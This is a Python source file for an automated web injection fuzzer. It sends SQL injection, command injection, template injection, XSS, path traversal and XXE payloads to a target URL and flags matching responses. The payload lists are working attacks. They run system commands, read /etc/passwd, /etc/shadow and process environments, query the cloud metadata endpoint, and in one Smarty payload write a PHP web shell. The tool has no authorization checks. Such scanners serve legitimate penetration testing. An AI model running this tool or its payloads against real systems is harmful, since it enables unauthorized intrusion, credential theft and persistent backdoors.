"""Injector — SQLi, CMDi, SSTI, XSS, Path Traversal, XXE fuzzer"""
import subprocess, re, json, time, urllib.parse

SQLI_PAYLOADS = [
    "'", '"', "' OR '1'='1", "' OR 1=1--", '" OR 1=1--',
    "' OR 1=1#", "1' ORDER BY 1--", "1' ORDER BY 2--", "1' ORDER BY 3--",
    "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "1; SELECT SLEEP(3)--", "1; WAITFOR DELAY '0:0:3'--",
    "' AND SLEEP(3)--", "1 AND 1=1", "1 AND 1=2",
    "' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--",
    "admin'--", "') OR ('1'='1",
]

SQLI_ERRORS = [
    "sql syntax","mysql","sqlite","postgresql","ora-","mssql",
    "syntax error","unclosed quotation","unterminated string",
    "warning: mysql","you have an error in your sql",
    "supplied argument is not a valid mysql","invalid query",
    "odbc sql","jdbc","native client","microsoft ole db",
]

CMDI_PAYLOADS = [
    ";id", ";whoami", "|id", "|whoami", "`id`", "$(id)",
    ";sleep 3", "|sleep 3", "&&sleep 3", "||sleep 3",
    ";cat /etc/passwd", "|cat /etc/passwd",
    ";ls -la", ";echo XC_PWNED",
    "\n/bin/id", "\r\n/bin/id",
    "&& echo XC_PWNED", "|| echo XC_PWNED",
    "$(echo XC_PWNED)", "`echo XC_PWNED`",
]

CMDI_SIGNS = ["root:","uid=","XC_PWNED","bin/bash","bin/sh",
              "www-data","daemon","nobody"]

SSTI_PAYLOADS = {
    "jinja2":   ["{{7*7}}", "{{7*'7'}}", "{{config}}", "{{config.items()}}",
                 "{{''..__class__.__mro__[1].__subclasses__()}}",
                 "{{''.__class__.__base__.__subclasses__()[132].__init__.__globals__['os'].popen('id').read()}}"],
    "twig":     ["{{7*7}}", "{{7*'7'}}", "{{dump(app)}}", "{{app.request.server.all|join(',')}}"],
    "freemarker":["${7*7}","<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}"],
    "velocity": ["#set($x=7*7)${x}", "#set($e=''.class.forName('java.lang.Runtime').getMethod('exec',''.class).invoke(''.class.forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'id'))"],
    "smarty":   ["{7*7}", "{php}echo `id`;{/php}", "{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,'<?php passthru($_GET[\"cmd\"]);?>',self::clearConfig())}"],
    "erb":      ["<%=7*7%>","<%= system('id') %>","<%= `id` %>"],
    "generic":  ["{{7*7}}","${7*7}","#{7*7}","<%= 7*7 %>","*{7*7}","{7*7}"],
}

SSTI_SIGNS = ["49","7777777","config","traceback","freemarker","velocity"]

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "javascript:alert(1)",
    "\"><script>alert(1)</script>",
    "'><script>alert(1)</script>",
    "<iframe src=javascript:alert(1)>",
    "<body onload=alert(1)>",
    "<input autofocus onfocus=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
    "%3Cscript%3Ealert(1)%3C/script%3E",
    "<scRiPt>alert(1)</sCriPt>",
    "<script>alert(document.cookie)</script>",
    "<svg/onload=alert`1`>",
]

PATH_TRAVERSAL = [
    "../../../../etc/passwd",
    "../../../../etc/shadow",
    "../../../../windows/win.ini",
    "../../../../windows/system32/drivers/etc/hosts",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "%252e%252e%252fetc%252fpasswd",
    "/etc/passwd","/etc/shadow","/etc/hostname",
    "/proc/self/environ","/proc/version",
    "C:\\windows\\win.ini","C:\\windows\\system32\\drivers\\etc\\hosts",
]

PT_SIGNS = ["root:","[fonts]","[boot loader]","127.0.0.1",
            "DOCUMENT_ROOT","PATH=","HOSTNAME="]

XXE_PAYLOADS = [
    '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><data>&xxe;</data>',
    '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><data>&xxe;</data>',
    '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><data>&xxe;</data>',
    '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY % remote SYSTEM "http://169.254.169.254/">%remote;]><data>test</data>',
]

XXE_SIGNS = ["root:","hostname","ami-","instance-id","placement"]

def curl(url, method="GET", data=None, headers=None, timeout=8, raw_data=None, content_type=None):
    cmd = ["curl","-sk","--max-time",str(timeout),"-L"]
    if method != "GET": cmd += ["-X", method]
    if raw_data:
        ct = content_type or "application/xml"
        cmd += ["-d", raw_data, "-H", f"Content-Type: {ct}"]
    elif data:
        cmd += ["-d", json.dumps(data), "-H", "Content-Type: application/json"]
    if headers:
        for k,v in headers.items(): cmd += ["-H", f"{k}: {v}"]
    cmd += ["-w", "\n__STATUS__%{http_code}", url]
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout+2)
        parts = r.stdout.rsplit("__STATUS__", 1)
        body = parts[0]
        code = int(parts[1]) if len(parts) > 1 else 0
        return body, code
    except: return "", 0

def fuzz_param(base_url, param, payloads, signs, label):
    """Inject payload into GET param, return findings."""
    findings = []
    parsed = urllib.parse.urlparse(base_url)
    qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    if not qs:
        qs = {param: [""]}
    for payload in payloads:
        for p in list(qs.keys()):
            test_qs = dict(qs)
            test_qs[p] = [payload]
            test_url = parsed._replace(query=urllib.parse.urlencode(test_qs, doseq=True)).geturl()
            body, code = curl(test_url, timeout=6)
            if any(s.lower() in body.lower() for s in signs):
                findings.append({
                    "type": label, "param": p, "payload": payload,
                    "evidence": body[:200], "status": code,
                    "severity": "HIGH" if label in ("sqli","cmdi","ssti","xxe") else "MEDIUM"
                })
                break
        time.sleep(0.1)
    return findings

def test_sqli(base_url):
    findings = []
    parsed = urllib.parse.urlparse(base_url)
    qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    params = list(qs.keys()) if qs else ["id","q","search","user","cat"]
    for param in params:
        for payload in SQLI_PAYLOADS:
            test_qs = dict(qs)
            test_qs[param] = [payload]
            url = parsed._replace(query=urllib.parse.urlencode(test_qs, doseq=True)).geturl()
            body, code = curl(url, timeout=6)
            body_l = body.lower()
            if any(s in body_l for s in SQLI_ERRORS):
                findings.append({
                    "type":"sqli","param":param,"payload":payload,
                    "evidence":body[:200],"status":code,"severity":"HIGH",
                    "note":"SQL error in response"
                })
                break
            # time-based blind
            if "sleep" in payload.lower() or "waitfor" in payload.lower():
                t0 = time.time()
                curl(url, timeout=8)
                elapsed = time.time() - t0
                if elapsed >= 2.8:
                    findings.append({
                        "type":"sqli_blind","param":param,"payload":payload,
                        "elapsed":round(elapsed,2),"severity":"HIGH",
                        "note":"Time-based blind SQLi detected"
                    })
                    break
        time.sleep(0.05)
    return findings

def test_cmdi(base_url):
    findings = []
    parsed = urllib.parse.urlparse(base_url)
    qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    params = list(qs.keys()) if qs else ["cmd","exec","command","ping","host","ip"]
    for param in params:
        for payload in CMDI_PAYLOADS:
            test_qs = dict(qs)
            test_qs[param] = [payload]
            url = parsed._replace(query=urllib.parse.urlencode(test_qs, doseq=True)).geturl()
            body, code = curl(url, timeout=8)
            if any(s in body for s in CMDI_SIGNS):
                findings.append({
                    "type":"cmdi","param":param,"payload":payload,
                    "evidence":body[:300],"status":code,"severity":"CRITICAL",
                    "note":"Command execution output in response"
                })
                break
        time.sleep(0.1)
    return findings

def test_ssti(base_url):
    findings = []
    parsed = urllib.parse.urlparse(base_url)
    qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    params = list(qs.keys()) if qs else ["name","template","msg","search","q"]
    for engine, payloads in SSTI_PAYLOADS.items():
        for param in params:
            for payload in payloads:
                test_qs = dict(qs)
                test_qs[param] = [payload]
                url = parsed._replace(query=urllib.parse.urlencode(test_qs, doseq=True)).geturl()
                body, code = curl(url, timeout=6)
                if "49" in body or "7777777" in body or any(s in body.lower() for s in SSTI_SIGNS):
                    findings.append({
                        "type":"ssti","engine":engine,"param":param,"payload":payload,
                        "evidence":body[:200],"status":code,"severity":"CRITICAL",
                        "note":f"SSTI {engine} — template injection confirmed"
                    })
                    break
            time.sleep(0.1)
    return findings

def test_xss(base_url):
    findings = []
    parsed = urllib.parse.urlparse(base_url)
    qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    params = list(qs.keys()) if qs else ["q","search","name","msg","input","redirect"]
    for param in params:
        for payload in XSS_PAYLOADS[:8]:
            test_qs = dict(qs)
            test_qs[param] = [payload]
            url = parsed._replace(query=urllib.parse.urlencode(test_qs, doseq=True)).geturl()
            body, code = curl(url, timeout=6)
            if payload.lower() in body.lower() or "alert(1)" in body:
                findings.append({
                    "type":"xss","param":param,"payload":payload,
                    "evidence":body[:200],"status":code,"severity":"MEDIUM",
                    "note":"Reflected XSS — payload echoed in response"
                })
                break
        time.sleep(0.05)
    return findings

def test_path_traversal(base_url):
    findings = []
    parsed = urllib.parse.urlparse(base_url)
    qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    params = list(qs.keys()) if qs else ["file","path","page","doc","filename","download"]
    for param in params:
        for payload in PATH_TRAVERSAL:
            test_qs = dict(qs)
            test_qs[param] = [payload]
            url = parsed._replace(query=urllib.parse.urlencode(test_qs, doseq=True)).geturl()
            body, code = curl(url, timeout=6)
            if any(s in body for s in PT_SIGNS):
                findings.append({
                    "type":"path_traversal","param":param,"payload":payload,
                    "evidence":body[:300],"status":code,"severity":"HIGH",
                    "note":"Path traversal — file content leaked"
                })
                break
        time.sleep(0.1)
    return findings

def test_xxe(base_url):
    findings = []
    for payload in XXE_PAYLOADS:
        body, code = curl(base_url, method="POST", raw_data=payload,
                          content_type="application/xml", timeout=8)
        if any(s in body for s in XXE_SIGNS):
            findings.append({
                "type":"xxe","payload":payload[:120],"evidence":body[:300],
                "status":code,"severity":"CRITICAL",
                "note":"XXE — external entity processed"
            })
        time.sleep(0.2)
    return findings

def run(target, full=False):
    base = re.sub(r'/$', '', target)
    findings = []

    findings += test_sqli(base)
    findings += test_cmdi(base)
    findings += test_ssti(base)
    findings += test_xss(base)
    findings += test_path_traversal(base)
    if full:
        findings += test_xxe(base)

    return {"module":"injector","target":base,"findings":findings}
